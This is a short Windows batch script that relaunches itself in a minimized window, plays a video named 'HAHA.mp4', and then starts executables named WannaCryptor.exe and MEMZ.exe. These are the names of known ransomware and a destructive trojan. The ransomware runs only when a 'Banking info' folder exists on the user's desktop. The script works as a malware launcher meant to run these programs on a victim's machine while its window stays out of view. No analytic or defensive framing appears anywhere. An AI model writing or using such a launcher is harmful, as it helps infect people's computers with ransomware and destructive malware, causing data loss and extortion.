if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
@echo off
if Exist "C:\Users\%username%\desktop\Banking info\WannaCryptor.exe" (
	start HAHA.mp4
	timeout 4 /nobreak
	start WannaCryptor.exe
	start MEMZ.exe
	exit
)
else(
	start HAHA.mp4
	timeout 4 /nobreak
	start MEMZ.exe
	exit
)
